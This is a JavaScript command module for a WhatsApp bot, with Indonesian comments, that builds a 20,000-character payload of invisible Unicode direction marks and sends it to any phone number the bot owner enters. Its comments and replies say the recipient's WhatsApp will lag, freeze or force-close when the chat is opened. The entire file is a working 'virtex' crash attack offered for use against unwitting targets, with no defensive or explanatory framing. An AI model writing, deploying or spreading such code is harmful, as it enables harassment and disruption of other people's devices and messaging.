// commands/owner/bug1.js — virtex bug crash: kirim teks pembalik arah tak terlihat (khusus owner).
// Saat target buka chat, render engine WA kewalahan → lag/beku/force-close (tergantung perangkat & versi).
// short: bug unicode sudah di-nerf di WA update terbaru; efek paling terasa di HP spek rendah/WA lama.
const { isOwner, normalize } = require("../../lib/owner");
const { getPrefix } = require("../../lib/prefix");
const { guarded } = require("../../lib/featureutil");

const MAX_LEN = 20000;

const buildVirtex = () => {
  const out = new Array(MAX_LEN);
  for (let i = 0; i < MAX_LEN; i++) {
    out[i] = i % 97 === 0 ? " " : i % 2 ? "\u200e" : "\u200f";
  }
  return out.join("");
};

const execute = async (client, message, args) => {
  const sender = message.key.remoteJid;
  const p = getPrefix(message);

  if (!isOwner(message)) {
    return await client.sendMessage(sender, { text: "❌ Command ini khusus owner." }, { quoted: message });
  }

  const num = normalize(args[0] || "");
  if (!num || num.length < 8) {
    return await client.sendMessage(sender, {
      text: `💥 *VIRTEX BUG*\n\nFormat: *${p}bug1 <nomor>*\nContoh: ${p}bug1 628123456789`
    }, { quoted: message });
  }

  const jid = `${num}@s.whatsapp.net`;
  const payload = buildVirtex();

  await client.sendMessage(sender, { text: `💥 *VIRTEX* → ${num}\nMengirim payload (${payload.length} karakter)...` }, { quoted: message });
  await client.sendMessage(jid, { text: payload });
  return await client.sendMessage(sender, { text: `✅ Virtex terkirim ke ${num}. WA target bakal lag/beku saat buka chat.` }, { quoted: message });
};

module.exports = {
  name: "bug1",
  command: ["bug1", "virtex", "bugwa"],
  category: "bug",
  visible: false,
  description: "Kirim virtex (bug crash) ke nomor target (owner)",
  execute: guarded("bug1", execute)
};